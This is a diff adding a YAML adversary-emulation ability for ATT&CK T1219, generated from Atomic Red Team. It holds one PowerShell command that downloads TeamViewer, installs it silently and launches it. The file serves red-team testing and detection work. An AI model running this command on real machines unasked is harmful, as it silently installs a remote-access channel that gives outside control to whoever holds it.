@@ -1,0 +1,15 @@
+- id: 75eee53b-6016-4822-9791-b0f7f9432bf6
+  name: Remote Access Tools
+  description: Ability for Remote Access Tools (ATT&CK T1219). Generated from Atomic
+    Red Team procedures; review and test safely before use.
+  tactic: command-and-control
+  technique:
+    attack_id: T1219
+    name: Remote Access Tools
+  platforms:
+    windows:
+      psh:
+        command: Invoke-WebRequest -OutFile C:\Users\$env:username\Desktop\TeamViewer_Setup.exe
+          https://download.teamviewer.com/download/TeamViewer_Setup.exe $file1 = "C:\Users\"
+          + $env:username + "\Desktop\TeamViewer_Setup.exe" Start-Process -Wait $file1
+          /S; Start-Process 'C:\Program Files (x86)\TeamViewer\TeamViewer.exe'
